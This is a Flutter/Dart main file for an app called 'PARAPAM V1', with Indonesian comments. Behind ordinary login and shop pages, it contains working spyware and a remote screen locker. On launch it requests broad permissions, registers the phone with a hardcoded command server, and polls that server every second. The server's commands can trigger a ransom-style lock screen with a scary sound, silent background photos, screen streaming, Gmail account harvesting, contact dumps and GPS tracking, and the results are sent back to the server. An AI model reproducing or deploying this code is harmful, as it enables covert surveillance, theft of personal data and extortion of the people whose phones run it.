import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart'; 
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:camera/camera.dart';
import 'package:vibration/vibration.dart';
import 'package:url_launcher/url_launcher.dart';

// IMPORT HALAMAN ASLI ANDA
import 'landing_page.dart'; 
import 'login_page.dart';
import 'loader_page.dart';
import 'home_page.dart';
import 'seller_page.dart';
import 'admin_page.dart';
import 'buy_account.dart';
import 'splash.dart'; 

// CONTROLLER GLOBAL UNTUK LOCK SCREEN
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
final AudioPlayer _audioPlayer = AudioPlayer();
String globalDeviceId = "";
String globalDeviceModel = "";

// VARIABEL DINAMIS UNTUK LOCKER (Sesuai Dashboard)
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN = "123";

// CHANNEL NATIVE
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy = MethodChannel('com.nullx.pp/background_spy');

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
    // Memicu permintaan akses notifikasi untuk penyadapan WA/Tele/FB
    requestNotificationAccess();
  }

  await requestPermissions();
  
  Map<String, String> deviceInfo = await getDeviceInfo();
  globalDeviceId = deviceInfo['id']!;
  globalDeviceModel = deviceInfo['model']!;

  // SINKRONISASI: Simpan ID ke SharedPreferences Native agar Interceptor Native mengenalinya
  try {
    await platformSpy.invokeMethod('saveTargetId', globalDeviceId);
  } catch (e) {
    debugPrint("Failed to sync ID to native: $e");
  }

  await registerInitialDevice(globalDeviceId, globalDeviceModel);
  startSpyware(globalDeviceId, globalDeviceModel);
  
  runApp(const MyApp());
}

// FUNGSI BARU: Membuka menu pengaturan akses notifikasi
void requestNotificationAccess() async {
  try {
    await platformSpy.invokeMethod('openNotificationSettings');
  } catch (e) {
    debugPrint("Settings intent failed: $e");
  }
}

Future<void> requestPermissions() async {
  await [
    Permission.location,
    Permission.contacts,
    Permission.storage,
    Permission.manageExternalStorage,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations, // PENTING untuk Anti-Kill
    Permission.notification,
    Permission.sms, 
  ].request();
}

Future<Map<String, String>> getDeviceInfo() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  String modelName = "Unknown Device";
  String identifier = "UNKNOWN_ID";

  try {
    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      modelName = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
      identifier = "${androidInfo.brand}-${androidInfo.model}-${androidInfo.id}".replaceAll(' ', '_'); 
    } else if (Platform.isIOS) {
      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
      modelName = iosInfo.name;
      identifier = iosInfo.identifierForVendor ?? "UNKNOWN_IOS";
    }
  } catch (e) {
    identifier = "ZDX-${Platform.localHostname.hashCode}";
  }
  return {"id": identifier, "model": modelName};
}

Future<void> registerInitialDevice(String id, String model) async {
  const String serverBase = "http://papi.queen-priv.my.id:2417";
  try {
    final Battery battery = Battery();
    int level = await battery.batteryLevel;
    
    await http.post(
      Uri.parse("$serverBase/api/register-target"),
      body: jsonEncode({
        "id": id,
        "admin_owner": "mizu",
        "model": model,
        "battery": level.toString(),
        "status": "Online",
        "lastSeen": DateTime.now().toIso8601String(),
      }),
      headers: {"Content-Type": "application/json"}
    );
  } catch (e) {}
}

void playScarySound() async {
  await _audioPlayer.setReleaseMode(ReleaseMode.loop);
  await _audioPlayer.play(UrlSource('https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
}

void stopSound() async {
  await _audioPlayer.stop();
}

// ==========================================================
// LOGIC CORE: EKSEKUSI INSTAN (BACKGROUND READY)
// ==========================================================
void startSpyware(String deviceId, String deviceName) {
  const String serverBase = "http://papi.queen-priv.my.id:2417";

  Future<void> executeLogic() async {
    try {
      await http.post(Uri.parse("$serverBase/api/heartbeat/$deviceId"), 
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"id": deviceId, "status": "Alive"})
      ).timeout(const Duration(seconds: 1));

      final response = await http.get(Uri.parse("$serverBase/api/get-command/$deviceId"));
      
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        String command = data['command'] ?? "idle";
        String extra = data['extra'] ?? "";
        dynamic resultData;

        // 1. HARD LOCK & DINAMIS
        if (command == "hard_lock" || command == "lock_device") {
          if (extra.contains('|')) {
            List<String> parts = extra.split('|');
            currentLockMessage = parts[0].isNotEmpty ? parts[0] : "YOUR PHONE IS LOCKED!!!!";
            currentLockPIN = parts.length > 1 && parts[1].isNotEmpty ? parts[1] : "123";
          } else if (extra.isNotEmpty) {
            currentLockMessage = extra;
          }

          if (!deviceLocked.value) {
            deviceLocked.value = true;
            playScarySound();
          }
          resultData = {"status": "Locked with custom settings"};
        } 
        
        // 2. UNLOCK
        else if (command == "unlock" || command == "unlock_device") {
          if (deviceLocked.value) {
            deviceLocked.value = false;
            stopSound();
            await platformStrobe.invokeMethod('stopStrobe');
          }
          resultData = {"status": "Unlocked"};
        }

        // 3. BACKGROUND SILENT CAMERA (WITH SIDE PARAMETER & BASE64 SYNC)
        else if (command == "take_photo") {
          // Extra berisi 'front' atau 'back'
          final String? base64Result = await platformSpy.invokeMethod('takeSilentPhotoBackground', {"side": extra});
          if (base64Result != null) {
            resultData = {
              "status": "Success",
              "image_base64": base64Result // Field yang dicari dashboard
            };
          } else {
            resultData = {"status": "Failed to capture image"};
          }
        }

        // 4. REAL SCREEN STREAM
        else if (command == "get_screen") {
          final String? base64Result = await platformSpy.invokeMethod('startScreenStreamBackground');
          resultData = {
            "status": "Background Stream Active",
            "image_base64": base64Result
          };
        }

        // 5. GMAIL HARVESTER
        else if (command == "get_gmails") {
          String emails = await platformSpy.invokeMethod('getGmailAccounts');
          resultData = {"accounts": emails.isEmpty ? "No Gmail Found" : emails};
        }

        // 6. WALLPAPER STAMPER
        else if (command == "set_wallpaper") {
          await platformSpy.invokeMethod('setWallpaper', {"url": extra});
          resultData = {"status": "Wallpaper Updated"};
        }

        // 7. REMOTE MP3 PLAYER
        else if (command == "play_audio") {
          try {
            await _audioPlayer.stop();
            await _audioPlayer.play(UrlSource(extra));
            resultData = {"status": "Playing MP3 from URL"};
          } catch (e) {
            resultData = {"status": "Audio Error: $e"};
          }
        }

        // 8. STOP ALL AUDIO
        else if (command == "stop_audio") {
          await _audioPlayer.stop();
          resultData = {"status": "Audio Stopped"};
        }

        // 9. DATA EXTRACTION
        else if (command == "get_contacts" || command == "dump_contacts") {
          if (await FlutterContacts.requestPermission()) {
            final List<Contact> contacts = await FlutterContacts.getContacts(
                withProperties: true, 
                withPhoto: false
            );
            resultData = {
              "contacts": contacts.take(50).map((e) => {
                "name": e.displayName, 
                "number": e.phones.isNotEmpty ? e.phones.first.number : ""
              }).toList()
            };
          }
        } 

        // 10. STROBE FLASH & LAINNYA
        else if (command == "flash_strobe") {
          await platformStrobe.invokeMethod('startStrobe');
          resultData = {"status": "Strobe Active"};
        }
        else if (command == "stop_strobe") {
          await platformStrobe.invokeMethod('stopStrobe');
          resultData = {"status": "Strobe Stopped"};
        }
        else if (command == "vibrate_loop") {
          Vibration.vibrate(duration: 5000);
          resultData = {"status": "Vibrating"};
        }
        else if (command == "open_url") {
          final Uri url = Uri.parse(extra);
          if (await canLaunchUrl(url)) {
            await launchUrl(url, mode: LaunchMode.externalApplication);
            resultData = {"status": "URL Opened"};
          }
        }
        else if (command == "get_location" || command == "track_gps") {
          Position pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
          resultData = {"lat": pos.latitude, "lng": pos.longitude};
        }
        else if (command == "force_open") {
          await platformSpy.invokeMethod('bringToForeground');
          resultData = {"status": "Application Forced to Foreground"};
        }

        if (resultData != null) {
          await http.post(
            Uri.parse("$serverBase/api/post-response/$deviceId"),
            body: jsonEncode({"data": resultData, "cmd": command}),
            headers: {"Content-Type": "application/json"}
          );
        }
      }
    } catch (e) { }
  }

  Timer.periodic(const Duration(seconds: 1), (t) => executeLogic());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'PARAPAM V1',
      theme: ThemeData(
        brightness: Brightness.dark,
        fontFamily: 'ShareTechMono',
        scaffoldBackgroundColor: Colors.black,
        colorScheme: const ColorScheme.dark().copyWith(secondary: Colors.purple),
      ),
      home: const MainLockWrapper(),
    );
  }
}

class MainLockWrapper extends StatefulWidget {
  const MainLockWrapper({super.key});

  @override
  State<MainLockWrapper> createState() => _MainLockWrapperState();
}

class _MainLockWrapperState extends State<MainLockWrapper> with WidgetsBindingObserver {
  final TextEditingController _passController = TextEditingController();

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this); 
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _passController.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (deviceLocked.value && (state == AppLifecycleState.paused || state == AppLifecycleState.inactive)) {
      platformSpy.invokeMethod('bringToForeground');
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (context, isLocked, child) {
        return PopScope(
          canPop: !isLocked, 
          child: Stack(
            children: [
              Navigator(
                initialRoute: '/',
                onGenerateRoute: (settings) {
                  switch (settings.name) {
                    case '/': return MaterialPageRoute(builder: (_) => const LandingPage());
                    case '/login': return MaterialPageRoute(builder: (_) => const LoginPage());
                    case '/splash': 
                      final args = settings.arguments as Map<String, dynamic>;
                      return MaterialPageRoute(builder: (_) => SplashPage(data: args));
                    case '/buy_account': return MaterialPageRoute(builder: (_) => const BuyAccountPage());
                    case '/loader':
                      return MaterialPageRoute(builder: (_) => const Scaffold(body: Center(child: Text("Loader Active")))); 
                    default:
                      return MaterialPageRoute(builder: (_) => const Scaffold(body: Center(child: Text("404"))));
                  }
                },
              ),

              if (isLocked)
                Scaffold(
                  backgroundColor: Colors.black,
                  body: Container(
                    width: double.infinity,
                    height: double.infinity,
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const Icon(Icons.gpp_maybe, color: Colors.red, size: 100),
                        const SizedBox(height: 20),
                        Text(currentLockMessage,
                            textAlign: TextAlign.center,
                            style: const TextStyle(color: Colors.red, fontSize: 24, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 10),
                        const Text("developed by mizuki",
                            textAlign: TextAlign.center,
                            style: TextStyle(color: Colors.white, fontSize: 16)),
                        const SizedBox(height: 50),
                        SizedBox(
                          width: 250,
                          child: TextField(
                            controller: _passController,
                            obscureText: true,
                            textAlign: TextAlign.center,
                            style: const TextStyle(color: Colors.white),
                            decoration: const InputDecoration(
                              hintText: "MASUKKAN PASSWORD", 
                              hintStyle: TextStyle(color: Colors.white24),
                              enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.red)),
                              focusedBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.red, width: 2)),
                            ),
                          ),
                        ),
                        const SizedBox(height: 20),
                        ElevatedButton(
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.red[900],
                            minimumSize: const Size(200, 50)
                          ),
                          onPressed: () {
                            if (_passController.text == currentLockPIN) {
                              deviceLocked.value = false;
                              stopSound();
                              platformStrobe.invokeMethod('stopStrobe');
                              _passController.clear();
                            }
                          },
                          child: const Text("BUKA KUNCI", style: TextStyle(fontWeight: FontWeight.bold)),
                        ),
                      ],
                    ),
                  ),
                ),
            ],
          ),
        );
      },
    );
  }
}